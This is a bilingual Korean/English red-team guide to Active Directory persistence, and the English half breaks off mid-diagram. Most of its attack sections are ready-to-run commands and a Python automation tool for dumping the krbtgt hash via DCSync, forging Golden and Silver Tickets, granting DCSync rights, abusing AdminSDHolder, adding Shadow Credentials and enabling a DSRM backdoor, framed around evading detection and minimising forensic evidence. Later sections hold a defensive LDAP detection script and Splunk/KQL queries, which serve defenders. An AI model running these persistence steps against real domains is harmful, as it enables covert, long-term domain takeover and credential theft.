> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# AD 지속성 — Golden Ticket·ACL 조작·탐지 CLI

## 0. 레드팀에서 지속성이 필요한 이유

### 0.1 지속성이란 무엇인가?

레드팀 작전에서 **지속성(Persistence)**은 초기 접근 권한을 잃었을 때를 대비한 "백업 열쇠"를 만들어 두는 것이다.

```
[지속성이 필요한 이유]

레드팀 침투 시나리오:
  Day 1: 피싱으로 직원 PC 침투 성공
          ↓
  Day 2: 보안팀이 해당 PC 악성코드 발견 및 격리
          ↓
  Day 3 (지속성 없음): 침투 처음부터 다시 시작 ← 실패
  Day 3 (지속성 있음): 백업 경로로 재접속 성공 ← 성공

현실 공격자도 같은 이유로 지속성을 확보한다:
  - 탐지/차단 시 재접속 보장
  - 장기 작전 수행 (수개월)
  - 여러 백도어로 단일 실패점 제거
```

### 0.2 레드팀 지속성 단계

```
[지속성 설정 우선순위]

1순위: 도메인 레벨 지속성
   └── Golden Ticket (krbtgt 해시 → 어떤 계정으로도 인증 가능)
   └── DCSync 권한 (언제든지 모든 해시 덤프 가능)

2순위: 계정 기반 지속성
   └── Shadow Credentials (인증서로 특정 계정 접근)
   └── 백도어 관리자 계정 생성

3순위: 객체/서비스 기반 지속성
   └── AdminSDHolder 수정 (60분마다 권한 자동 전파)
   └── GPO 지속성

[선택 기준]
  - 탐지 위험도 낮을수록 선호
  - 장기 유지가 필요할수록 도메인 레벨 선호
  - 포렌식 증거 최소화 우선
```

---

## 1. AD 지속성 기법 분류

```
도메인 장악 후 지속성 유지 방법:

[티켓 기반]
  Golden Ticket  — krbtgt 해시로 임의 TGT 위조 (20년 유효)
  Silver Ticket  — 서비스 계정 해시로 서비스 티켓 위조
  Diamond Ticket — 정상 TGT 수정 (탐지 어려움)
  Sapphire Ticket — PAC 암호화 유지 (FAST 우회)

[계정 기반]
  관리자 계정 생성
  AdminSDHolder 수정 — 보호 계정 ACL 전파
  DSRM 비밀번호 설정
  골든 gMSA — gMSA 계정 해시 탈취

[객체 기반]
  DCSync 권한 ACL — DS-Replication 권한 부여
  Shadow Credentials — msDS-KeyCredentialLink 수정
  SID History 주입
  DCOM 백도어
  GPO 지속성
```

---

## 2. Golden Ticket vs Silver Ticket 비교

### 2.1 핵심 차이점 비교표

| 항목 | Golden Ticket | Silver Ticket |
|------|---------------|---------------|
| 필요 해시 | `krbtgt` NTLM 해시 | 서비스 계정 NTLM 해시 |
| 위조 객체 | TGT (티켓 발급 티켓) | TGS (서비스 티켓) |
| 접근 범위 | 도메인 내 모든 서비스 | 특정 서비스만 |
| KDC 통신 | 필요 없음 (TGT 자체 위조) | 필요 없음 (TGS 자체 위조) |
| 유효 기간 | 원하는 만큼 (20년 설정 가능) | 원하는 만큼 |
| 탐지 용이성 | 상대적으로 탐지 용이 | 탐지 매우 어려움 |
| 탐지 이벤트 | 4769 (이상한 RC4/비존재 사용자) | 거의 없음 |
| 무효화 방법 | krbtgt 비밀번호 2회 초기화 | 서비스 계정 비밀번호 변경 |
| 공격 전제조건 | DCSync 권한 또는 DC 직접 접근 | 서비스 계정 해시 탈취 |

### 2.2 Kerberos 인증 흐름과 티켓 위치

```
[정상 Kerberos 인증 흐름]

클라이언트           KDC (DC)          서비스 서버
    │                  │                    │
    │ ─AS-REQ──────→   │                    │
    │   (Pre-auth)      │                    │
    │ ←AS-REP────────   │                    │  ← Golden Ticket은
    │   (TGT)           │                    │    이 단계를 위조
    │                  │                    │
    │ ─TGS-REQ─────→   │                    │
    │   (TGT 제시)      │                    │
    │ ←TGS-REP───────   │                    │  ← Silver Ticket은
    │   (TGS/서비스 티켓) │                   │    이 단계를 위조
    │                  │                    │
    │ ─AP-REQ──────────────────────────────→ │
    │   (TGS 제시)                            │
    │ ←AP-REP──────────────────────────────  │
    │   (인증 성공)                            │
```

---

## 3. Golden Ticket

```bash
# 1단계: krbtgt 해시 획득 (DCSync)
python3 secretsdump.py -just-dc-user krbtgt domain.local/admin:Password@DC_IP

# 2단계: 도메인 SID 획득
python3 getPac.py domain.local/admin:Password@DC_IP
# 또는
powershell: (Get-ADDomain).DomainSID.Value

# 3단계: Golden Ticket 생성 (Impacket)
python3 ticketer.py \
  -nthash KRBTGT_NTLM_HASH \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain domain.local \
  -duration 87600 \
  administrator

# 4단계: 티켓 사용
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@dc.domain.local

# Mimikatz (Windows)
mimikatz # kerberos::golden /user:fakeuser /domain:domain.local \
  /sid:S-1-5-21-XXXX /krbtgt:HASH /id:500 /groups:512 /ptt
mimikatz # misc::cmd
```

### 3.1 Golden Ticket 단계별 설명

```
[Golden Ticket 생성 과정]

Step 1: krbtgt 해시 획득
  - krbtgt = KDC가 TGT를 서명하는 계정
  - 이 해시로 서명된 TGT는 KDC가 유효하다고 판단
  - 획득 방법: DCSync (도메인 복제 권한 필요)

Step 2: 도메인 SID 획득
  - 예: S-1-5-21-1234567890-1234567890-1234567890
  - 모든 도메인 객체의 SID에 포함되는 도메인 고유 식별자

Step 3: 티켓 생성
  - 어떤 사용자명이든 사용 가능 (존재하지 않아도 됨!)
  - 그룹 멤버십을 임의로 지정 가능 (512 = Domain Admins)
  - 유효 기간을 최대 20년으로 설정 가능

Step 4: 티켓 사용
  - Linux: KRB5CCNAME 환경변수로 티켓 경로 지정
  - Windows: /ptt (Pass-The-Ticket) 플래그로 메모리에 주입
```

---

## 4. Silver Ticket

Silver Ticket는 특정 서비스에만 유효하고 KDC와 통신하지 않아 탐지가 어렵다.

```bash
# CIFS (SMB) Silver Ticket
python3 ticketer.py \
  -nthash SERVICE_ACCOUNT_NTLM \
  -domain-sid S-1-5-21-XXXX \
  -domain domain.local \
  -spn cifs/server.domain.local \
  administrator

export KRB5CCNAME=administrator.ccache
python3 smbclient.py -k -no-pass //server.domain.local/C$

# HOST Silver Ticket (WMI/원격 스케줄러)
python3 ticketer.py -nthash HASH -domain-sid SID -domain domain.local \
  -spn host/server.domain.local administrator
```

### 4.1 Silver Ticket 대상 SPN 목록

| SPN | 접근 가능 서비스 |
|-----|----------------|
| `cifs/server` | SMB 파일 공유, ADMIN$, C$ |
| `host/server` | WMI, 원격 스케줄러, 서비스 관리 |
| `http/server` | IIS 웹 서비스 |
| `mssql/server` | SQL Server |
| `wsman/server` | WinRM (PowerShell 원격) |
| `rpcss/server` | DCOM/RPC |
| `ldap/dc` | LDAP 쿼리 (DC 대상) |

---

## 5. ACL 기반 지속성

### 5.1 DCSync 권한 부여

```powershell
# PowerView로 DCSync 권한 부여
Import-Module PowerView.ps1

$attacker = "DOMAIN\attacker_user"

# DS-Replication-Get-Changes
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" `
  -PrincipalIdentity $attacker `
  -Rights DCSync `
  -Verbose

# 확인
Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs |
  Where-Object {$_.SecurityIdentifier -match (Get-ADUser $attacker).SID}
```

### 5.2 AdminSDHolder 남용 (단계별)

AdminSDHolder는 `CN=AdminSDHolder,CN=System,DC=domain,DC=local`에 위치한 특수 컨테이너로, 보호 그룹 멤버들의 ACL 템플릿 역할을 한다. SDProp 프로세스가 60분마다 실행되면서 보호 계정들의 ACL을 AdminSDHolder의 ACL로 덮어씌운다.

```
[AdminSDHolder 남용 흐름]

1. 공격자가 AdminSDHolder에 자신의 계정을 GenericAll 권한으로 추가
         ↓
2. SDProp 실행 (최대 60분 대기, 또는 강제 실행)
         ↓
3. Domain Admins, Enterprise Admins 등 모든 보호 그룹 멤버에
   공격자 계정의 GenericAll 권한이 전파됨
         ↓
4. 공격자는 이제 모든 Domain Admin 계정의 비밀번호를 변경할 수 있음!
         ↓
5. 보안팀이 Domain Admin 계정 비밀번호를 초기화해도
   SDProp이 다시 실행되면 권한이 복구됨 (자동 지속성!)
```

```powershell
# AdminSDHolder 컨테이너에 권한 추가
# SDProp (60분마다) 실행 시 보호 계정에 권한 전파됨
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" `
  -PrincipalIdentity attacker_user `
  -Rights All

# SDProp 즉시 실행 (관리자 권한)
Invoke-SDPropagator -ShowProgress -timeoutMinutes 1

# 전파 확인 — DA 계정에 공격자 권한이 생겼는지 확인
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
  Where-Object {$_.IdentityReference -match "attacker_user"}
```

### 5.3 Shadow Credentials (상세 설명)

Shadow Credentials는 `msDS-KeyCredentialLink` 속성에 X.509 인증서를 추가하는 공격이다.

```
[Shadow Credentials 작동 원리]

정상 인증서 기반 인증:
  1. 사용자가 스마트카드/인증서 보유
  2. DC의 msDS-KeyCredentialLink에 해당 인증서 공개키 등록
  3. 인증 시 인증서의 개인키로 서명 → DC가 공개키로 검증

Shadow Credentials 공격:
  1. 공격자가 임의의 인증서 생성 (공개키/개인키 쌍)
  2. 타깃 계정의 msDS-KeyCredentialLink에 공격자 공개키 추가
  3. 공격자는 자신의 개인키로 인증 → DC가 등록된 공개키로 검증
  4. 비밀번호 없이 타깃 계정으로 인증 성공!

탐지: 이벤트 5136 (디렉터리 서비스 개체 수정)
전제조건: 타깃 계정에 대한 GenericWrite 또는 WriteProperty(msDS-KeyCredentialLink) 권한
```

```bash
# pywhisker — msDS-KeyCredentialLink 수정
python3 pywhisker.py -d domain.local -u admin -p Password \
  --target victim_user --action add --filename shadow_cert

# 생성된 인증서로 인증
python3 gettgtpkinit.py domain.local/victim_user -cert-pfx shadow_cert.pfx \
  -pfx-pass pfx_password victim.ccache

export KRB5CCNAME=victim.ccache
python3 getnthash.py domain.local/victim_user -key session_key
```

### 5.4 SID History 주입

SID History는 원래 도메인 마이그레이션 시 사용자의 이전 SID를 보존하기 위한 기능이다. 이를 악용하면 임의의 SID를 주입해 추가 권한을 획득할 수 있다.

```
[SID History 주입 시나리오]

정상 사용 (도메인 마이그레이션):
  - 구 도메인: alice(SID: S-1-5-21-OLD-...-1001)
  - 신 도메인: alice2(SID: S-1-5-21-NEW-...-2001, SIDHistory: S-1-5-21-OLD-...-1001)
  - alice2로 로그인해도 구 도메인 리소스 접근 가능

악용:
  - 공격자가 일반 계정에 Enterprise Admin SID를 SIDHistory에 추가
  - 해당 계정은 Enterprise Admin처럼 행동!
  - 탐지하기 어려움 (일반 계정처럼 보임)
```

```bash
# Impacket으로 SID History 주입 (mimikatz 대안)
# 1단계: Domain SID 확인
python3 lookupsid.py corp.local/admin:Password@DC_IP | grep "Domain SID"

# 2단계: Enterprise Admins SID 확인
# Enterprise Admins = Domain SID + -519

# 3단계: Python으로 SID History 조작 (권한 필요)
# mimikatz: sid::patch, sid::add /sam:targetuser /new:S-1-5-21-...-519
```

---

## 6. DSRM 백도어

```powershell
# DSRM (Directory Services Restore Mode) 계정 활성화
# 모든 DC에 로컬 관리자 계정이 존재 (오프라인 복구용)

# DSRM 패스워드 변경
ntdsutil "set dsrm password" "reset password on server DC1" null

# 레지스트리 설정 — 네트워크 로그인 허용
New-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\`
  -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD

# PtH로 DSRM 계정 사용
python3 secretsdump.py -sam -hashes :DSRM_HASH ./administrator@DC_IP
```

---

## 7. Python Impacket 예제 — 각 기법별

```python
#!/usr/bin/env python3
"""
AD 지속성 기법 Impacket 자동화 모음
사용법: python3 ad_persistence_tools.py <기법> [옵션]

기법 목록:
  dcsync       - krbtgt 해시 덤프
  golden       - Golden Ticket 생성
  silver       - Silver Ticket 생성
  shadowcreds  - Shadow Credentials 추가
"""

import argparse
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path


@dataclass
class TicketConfig:
    """Kerberos 티켓 생성 설정."""
    nthash: str
    domain_sid: str
    domain: str
    username: str
    duration_hours: int = 87600  # 10년
    spn: str | None = None       # Silver Ticket용
    groups: list[int] | None = None


def run_cmd(cmd: list[str], description: str) -> tuple[bool, str]:
    """명령어 실행 후 결과 반환."""
    print(f"[*] {description}")
    print(f"    CMD: {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=60
        )
        if result.returncode == 0:
            print(f"[+] 성공")
            return True, result.stdout
        else:
            print(f"[-] 실패: {result.stderr[:300]}")
            return False, result.stderr
    except subprocess.TimeoutExpired:
        print(f"[-] 타임아웃")
        return False, "Timeout"
    except FileNotFoundError as e:
        print(f"[-] 실행 파일 없음: {e}")
        return False, str(e)


def dcsync_krbtgt(dc_ip: str, domain: str, username: str, password: str) -> None:
    """DCSync로 krbtgt 해시 획득."""
    cmd = [
        "python3", "-m", "impacket.examples.secretsdump",
        "-just-dc-user", "krbtgt",
        f"{domain}/{username}:{password}@{dc_ip}",
    ]
    success, output = run_cmd(cmd, "DCSync: krbtgt 해시 획득")
    if success:
        # 해시 파싱
        for line in output.splitlines():
            if "krbtgt" in line.lower() and ":::" in line:
                parts = line.split(":")
                if len(parts) >= 4:
                    ntlm_hash = parts[3]
                    print(f"\n[!] krbtgt NTLM 해시: {ntlm_hash}")
                    print("[!] 이 해시로 Golden Ticket을 생성할 수 있습니다!")


def create_golden_ticket(config: TicketConfig, output_file: str = "golden.ccache") -> None:
    """Golden Ticket 생성."""
    groups = config.groups or [512, 513, 518, 519, 520]
    groups_str = ",".join(str(g) for g in groups)

    cmd = [
        "python3", "-m", "impacket.examples.ticketer",
        "-nthash", config.nthash,
        "-domain-sid", config.domain_sid,
        "-domain", config.domain,
        "-duration", str(config.duration_hours),
        "-groups", groups_str,
        config.username,
    ]
    success, _ = run_cmd(cmd, f"Golden Ticket 생성: {config.username}@{config.domain}")
    if success:
        print(f"\n[+] 생성됨: {config.username}.ccache")
        print(f"[*] 사용법:")
        print(f"    export KRB5CCNAME={config.username}.ccache")
        print(f"    python3 -m impacket.examples.psexec -k -no-pass "
              f"{config.domain}/{config.username}@dc.{config.domain}")


def create_silver_ticket(config: TicketConfig, output_suffix: str = "silver") -> None:
    """Silver Ticket 생성 (서비스별)."""
    if not config.spn:
        print("[-] Silver Ticket에는 SPN이 필요합니다 (예: cifs/server.domain.local)")
        return

    cmd = [
        "python3", "-m", "impacket.examples.ticketer",
        "-nthash", config.nthash,
        "-domain-sid", config.domain_sid,
        "-domain", config.domain,
        "-spn", config.spn,
        config.username,
    ]
    success, _ = run_cmd(cmd, f"Silver Ticket 생성: {config.spn}")
    if success:
        ticket_file = f"{config.username}.ccache"
        print(f"\n[+] 생성됨: {ticket_file}")
        service_type = config.spn.split("/")[0].upper()
        print(f"[*] 사용법 ({service_type}):")
        print(f"    export KRB5CCNAME={ticket_file}")
        if service_type == "CIFS":
            server = config.spn.split("/")[1]
            print(f"    python3 -m impacket.examples.smbclient -k -no-pass "
                  f"//{server}/C$")
        elif service_type == "HOST":
            server = config.spn.split("/")[1]
            print(f"    python3 -m impacket.examples.wmiexec -k -no-pass "
                  f"{config.domain}/{config.username}@{server}")


def grant_dcsync_rights(
    dc_ip: str,
    domain: str,
    admin_user: str,
    admin_pass: str,
    target_user: str,
) -> None:
    """대상 계정에 DCSync 권한 부여 (PowerShell 필요)."""
    print(f"[*] DCSync 권한 부여: {target_user}")
    print("[!] 이 작업은 도메인 관리자 권한이 필요합니다")

    # PowerShell 스크립트 생성
    base_dn = ",".join(f"DC={p}" for p in domain.split("."))
    ps_script = f"""
$principal = "{domain}\\{target_user}"
$target = "{base_dn}"

# DS-Replication-Get-Changes GUID
$drs_guid = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
$drs_all_guid = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

$sid = (Get-ADUser {target_user}).SID

$rule1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid, "ExtendedRight", "Allow",
    [System.Guid]$drs_guid
)
$rule2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid, "ExtendedRight", "Allow",
    [System.Guid]$drs_all_guid
)

$domain_obj = [ADSI]"LDAP://{base_dn}"
$domain_obj.psbase.ObjectSecurity.AddAccessRule($rule1)
$domain_obj.psbase.ObjectSecurity.AddAccessRule($rule2)
$domain_obj.psbase.CommitChanges()

Write-Host "[+] DCSync 권한 부여 완료: $principal"
"""
    script_path = Path("/tmp/grant_dcsync.ps1")
    script_path.write_text(ps_script)
    print(f"[*] PowerShell 스크립트 저장: {script_path}")
    print("[!] 대상 시스템에서 실행: powershell -ExecutionPolicy Bypass -File grant_dcsync.ps1")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="AD 지속성 기법 자동화",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = parser.add_subparsers(dest="technique", required=True)

    # DCSync 서브커맨드
    dc_p = sub.add_parser("dcsync", help="krbtgt 해시 덤프")
    dc_p.add_argument("dc_ip", help="DC IP 주소")
    dc_p.add_argument("domain", help="도메인 (예: corp.local)")
    dc_p.add_argument("-u", "--user", required=True, help="관리자 계정")
    dc_p.add_argument("-p", "--password", required=True, help="비밀번호")

    # Golden Ticket 서브커맨드
    gt_p = sub.add_parser("golden", help="Golden Ticket 생성")
    gt_p.add_argument("domain", help="도메인")
    gt_p.add_argument("--hash", required=True, help="krbtgt NTLM 해시")
    gt_p.add_argument("--sid", required=True, help="도메인 SID")
    gt_p.add_argument("--user", default="administrator", help="티켓 사용자명")
    gt_p.add_argument("--duration", type=int, default=87600, help="유효기간(시간)")

    # Silver Ticket 서브커맨드
    sv_p = sub.add_parser("silver", help="Silver Ticket 생성")
    sv_p.add_argument("domain", help="도메인")
    sv_p.add_argument("--hash", required=True, help="서비스 계정 NTLM 해시")
    sv_p.add_argument("--sid", required=True, help="도메인 SID")
    sv_p.add_argument("--spn", required=True, help="SPN (예: cifs/server.corp.local)")
    sv_p.add_argument("--user", default="administrator", help="티켓 사용자명")

    # DCSync 권한 부여 서브커맨드
    gr_p = sub.add_parser("grant-dcsync", help="DCSync 권한 부여")
    gr_p.add_argument("dc_ip")
    gr_p.add_argument("domain")
    gr_p.add_argument("-u", "--user", required=True, help="관리자 계정")
    gr_p.add_argument("-p", "--password", required=True, help="비밀번호")
    gr_p.add_argument("--target", required=True, help="권한 부여할 계정")

    args = parser.parse_args()

    if args.technique == "dcsync":
        dcsync_krbtgt(args.dc_ip, args.domain, args.user, args.password)

    elif args.technique == "golden":
        config = TicketConfig(
            nthash=args.hash,
            domain_sid=args.sid,
            domain=args.domain,
            username=args.user,
            duration_hours=args.duration,
        )
        create_golden_ticket(config)

    elif args.technique == "silver":
        config = TicketConfig(
            nthash=args.hash,
            domain_sid=args.sid,
            domain=args.domain,
            username=args.user,
            spn=args.spn,
        )
        create_silver_ticket(config)

    elif args.technique == "grant-dcsync":
        grant_dcsync_rights(
            args.dc_ip, args.domain, args.user, args.password, args.target
        )


if __name__ == "__main__":
    main()
```

---

## 8. AD 지속성 탐지 CLI

```python
#!/usr/bin/env python3
"""AD 지속성 기법 탐지 자동화 CLI."""

import argparse
import json
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from ldap3 import ALL, NTLM, SAFE_SYNC, Connection, Server, SUBTREE


DANGEROUS_ACLS = {
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
    "0e10c968-78fb-11d2-90d4-00c04f79dc55": "Certificate-Enrollment",
}

PROTECTED_GROUPS = [
    "Domain Admins", "Enterprise Admins", "Administrators",
    "Schema Admins", "Account Operators", "Backup Operators",
    "Print Operators", "Server Operators", "Group Policy Creator Owners",
]


@dataclass
class PersistenceIndicator:
    indicator_type: str
    subject: str
    detail: str
    risk: str
    detected_at: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )


class ADPersistenceDetector:
    def __init__(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
    ) -> None:
        self.base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            client_strategy=SAFE_SYNC,
            auto_bind=True,
        )

    def check_admin_account_creation(self, days: int = 30) -> list[PersistenceIndicator]:
        """최근 생성된 관리자 그룹 멤버 탐지."""
        indicators: list[PersistenceIndicator] = []
        from datetime import timedelta

        cutoff = datetime.now(timezone.utc) - timedelta(days=days)

        for group in PROTECTED_GROUPS:
            group_dn = f"CN={group},CN=Users,{self.base_dn}"
            self.conn.search(
                search_base=self.base_dn,
                search_filter=f"(&(memberOf={group_dn})(whenCreated>={cutoff.strftime('%Y%m%d%H%M%SZ')}))",
                attributes=["sAMAccountName", "whenCreated", "description"],
            )
            for entry in self.conn.entries:
                indicators.append(PersistenceIndicator(
                    indicator_type="NEW_ADMIN_ACCOUNT",
                    subject=str(entry.sAMAccountName),
                    detail=f"Group: {group}, Created: {entry.whenCreated}",
                    risk="HIGH",
                ))

        return indicators

    def check_pwdneverexpires(self) -> list[PersistenceIndicator]:
        """패스워드 만료 없는 계정 탐지 (백도어 가능성)."""
        indicators: list[PersistenceIndicator] = []

        # userAccountControl bit 65536 = DONT_EXPIRE_PASSWORD
        self.conn.search(
            search_base=self.base_dn,
            search_filter="(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(objectClass=computer)))",
            attributes=["sAMAccountName", "memberOf", "lastLogonTimestamp"],
        )

        for entry in self.conn.entries:
            username = str(entry.sAMAccountName)
            members = entry.memberOf.values if hasattr(entry.memberOf, 'values') else []
            is_privileged = any(
                g.upper() in str(m).upper()
                for g in ["DOMAIN ADMINS", "ADMINISTRATORS"]
                for m in members
            )
            indicators.append(PersistenceIndicator(
                indicator_type="PWD_NEVER_EXPIRES",
                subject=username,
                detail=f"In privileged group: {is_privileged}",
                risk="HIGH" if is_privileged else "MEDIUM",
            ))

        return indicators

    def check_shadow_credentials(self) -> list[PersistenceIndicator]:
        """msDS-KeyCredentialLink 수정 탐지 (Shadow Credentials)."""
        indicators: list[PersistenceIndicator] = []

        self.conn.search(
            search_base=self.base_dn,
            search_filter="(msDS-KeyCredentialLink=*)",
            attributes=["sAMAccountName", "msDS-KeyCredentialLink"],
        )

        for entry in self.conn.entries:
            indicators.append(PersistenceIndicator(
                indicator_type="SHADOW_CREDENTIALS",
                subject=str(entry.sAMAccountName),
                detail=f"KeyCredential count: {len(entry['msDS-KeyCredentialLink'].values)}",
                risk="HIGH",
            ))

        return indicators

    def run_all_checks(self) -> list[PersistenceIndicator]:
        all_indicators: list[PersistenceIndicator] = []

        print("[*] Checking new admin account creation...")
        all_indicators.extend(self.check_admin_account_creation())

        print("[*] Checking password never expires accounts...")
        all_indicators.extend(self.check_pwdneverexpires())

        print("[*] Checking Shadow Credentials...")
        all_indicators.extend(self.check_shadow_credentials())

        return all_indicators

    def close(self) -> None:
        self.conn.unbind()


def main() -> None:
    parser = argparse.ArgumentParser(description="AD Persistence Detection")
    parser.add_argument("dc", help="DC IP")
    parser.add_argument("domain", help="Domain (e.g.: corp.local)")
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("-o", "--output", type=Path)
    args = parser.parse_args()

    detector = ADPersistenceDetector(args.dc, args.domain, args.user, args.password)
    indicators = detector.run_all_checks()
    detector.close()

    risk_counts = {"HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for ind in indicators:
        risk_counts[ind.risk] = risk_counts.get(ind.risk, 0) + 1
        icon = "!" if ind.risk == "HIGH" else "?"
        print(f"\n[{icon}] [{ind.risk}] {ind.indicator_type}")
        print(f"  Subject: {ind.subject}")
        print(f"  Detail: {ind.detail}")

    print(f"\nTotal {len(indicators)} — HIGH:{risk_counts['HIGH']} / MEDIUM:{risk_counts['MEDIUM']}")

    if args.output:
        args.output.write_text(
            json.dumps(
                [vars(i) for i in indicators],
                indent=2, ensure_ascii=False,
            )
        )


if __name__ == "__main__":
    main()
```

---

## 9. 지속성 방어 및 탐지

### 9.1 Splunk/KQL 탐지 쿼리

```splunk
# Splunk — DCSync 탐지
index=winsecurity EventCode=4662
| eval prop_guid=mvindex(Properties,0)
| where prop_guid IN (
    "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
    "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"
  )
| where NOT (SubjectUserName LIKE "%$%")
| stats count by SubjectUserName, IpAddress, _time
| where count > 0
```

```kql
// KQL (Microsoft Sentinel) — Shadow Credentials 탐지
SecurityEvent
| where EventID == 5136
| where ObjectClass == "user"
| where AttributeLDAPDisplayName == "msDS-KeyCredentialLink"
| where OperationType == "%%14674"  // 값 추가
| project TimeGenerated, SubjectUserName, ObjectName, AttributeValue
| extend Severity = "High"
```

```kql
// KQL — Golden Ticket 탐지 (비존재 사용자 또는 RC4 암호화 TGS)
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"  // RC4-HMAC (취약한 암호화)
| where ServiceName !endswith "$"
| summarize count() by AccountName, ClientAddress, ServiceName, bin(TimeGenerated, 1h)
| where count_ > 10
```

```kql
// KQL — AdminSDHolder 수정 탐지
SecurityEvent
| where EventID == 5136
| where ObjectDN contains "CN=AdminSDHolder"
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName
| extend Alert = "AdminSDHolder Modified — Potential Persistence"
```

### 9.2 탐지 및 방어 요약표

| 지속성 기법 | 탐지 이벤트 | 방어 |
|-------------|-------------|------|
| Golden Ticket | 4769 — RC4 암호화 TGS / 비존재 사용자 | krbtgt 정기 재설정 (2회) + AES 강제 |
| Silver Ticket | 4627 — 서비스 접근 이상 | PAC 검증 활성화 |
| DCSync | 4662 — DS-Replication 이벤트 | SIEM 룰 / Canary 계정 |
| Shadow Credentials | 5136 — 디렉터리 서비스 수정 | msDS-KeyCredentialLink 변경 모니터링 |
| AdminSDHolder | 5136 — AdminSDHolder 수정 | SDProp 로그 모니터링 |
| 신규 관리자 | 4728, 4732 — 그룹 멤버 추가 | 보호 그룹 변경 알림 |
| DSRM 활성화 | 레지스트리 변경 | DsrmAdminLogonBehavior=0 강제 |
| SID History 주입 | 4765, 4766 — SID History 추가 | SID 필터링 활성화 |

---

<a name="english"></a>

# AD Persistence — Golden Ticket, ACL Manipulation, and Detection CLI

## 0. Why Persistence Matters in Red Team Operations

### 0.1 What Is Persistence?

In red team operations, **persistence** is about creating "backup keys" so that if your initial foothold is discovered, you can still re-enter the environment.

```
[Why persistence matters]

Red team scenario without persistence:
  Day 1: Phishing succeeds, employee PC compromised
  Day 2: Security team finds malware, isolates the PC
  Day 3: Back to square one — start over from scratch (FAILURE)

Red team scenario with persistence:
  Day 1: Phishing succeeds, persistence established across multiple paths
  Day 2: Security team finds and removes the initial implant
  Day 3: Reconnect via backup path (SUCCESS)

Real attackers follow the same logic:
  - Guarantee re-access if detected/blocked
  - Enable long-term operations (months)
  - Multiple backdoors eliminate single points of failure
```

### 0.2 Persistence Priority in Red Team Ops

```
[Persistence priority order]

Tier 1: Domain-level persistence (highest value)
  └── Golden Ticket (any account can be impersonated with krbtgt hash)
  └── DCSync rights (dump all hashes on demand, forever)

Tier 2: Account-based persistence
  └── Shadow Credentials (certificate auth bypass for specific accounts)
  └── Backdoor admin account creation

Tier 3: Object/service-based persistence
  └── AdminSDHolder modification (auto-propagates every 60 minutes)
  └── GPO persistence

[Selection criteria]
  - Lower detection risk = preferred
  - Longer-term operations = prefer domain-level
  - Minimize forensic evidence
```

---

## 1. AD Persistence Technique Classification

After domain dominance, attackers establish multiple persistence mechanisms to maintain long-term access even if their initial foothold is discovered.

**Ticket-based persistence:**
- **Golden Ticket** — forged TGT signed with krbtgt hash, valid for up to 20 years
- **Silver Ticket** — forged service ticket, doesn't touch KDC (harder to detect)
- **Diamond Ticket** — modified legitimate TGT (evades PAC validation)
- **Sapphire Ticket** — maintains PAC encryption (bypasses FAST)

**Account-based persistence:**
- Create backdoor administrator accounts
- Modify AdminSDHolder (propagates ACL to all protected accounts via SDProp)
- Set DSRM password (every DC has a local admin account for offline recovery)
- Steal gMSA account hash

**Object-based persistence:**
- Grant DCSync rights via ACL modification
- Shadow Credentials — modify `msDS-KeyCredentialLink` for certificate-based auth backdoor
- SID History injection
- DCOM backdoor
- GPO persistence

---

## 2. Golden Ticket vs Silver Ticket Comparison

| Attribute | Golden Ticket | Silver Ticket |
|-----------|---------------|---------------|
| Required hash | `krbtgt` NTLM hash | Service account NTLM hash |
| Forged object | TGT (Ticket-Granting Ticket) | TGS (service ticket) |
| Access scope | Any service in the domain | Specific service only |
| KDC communication | None (TGT itself is forged) | None (TGS itself is forged) |
| Validity period | Arbitrary (up to 20 years) | Arbitrary |
| Detectability | Relatively detectable | Very difficult to detect |
| Detection event | 4769 (RC4 encryption / non-existent user) | Almost none |
| Invalidation | Reset krbtgt password twice | Change service account password |
| Prerequisite | DCSync rights or direct DC access | Service account hash |

### 2.1 Where Tickets Fit in the Kerberos Flow

```
[Normal Kerberos authentication]

Client              KDC (DC)           Service Server
  │                   │                     │
  │ ──AS-REQ────────> │                     │
  │   (Pre-auth)      │                     │
  │ <──AS-REP──────── │                     │ ← Golden Ticket forges this
  │   (TGT)           │                     │
  │                   │                     │
  │ ──TGS-REQ───────> │                     │
  │   (presents TGT)  │                     │
  │ <──TGS-REP──────  │                     │ ← Silver Ticket forges this
  │   (service ticket) │                    │
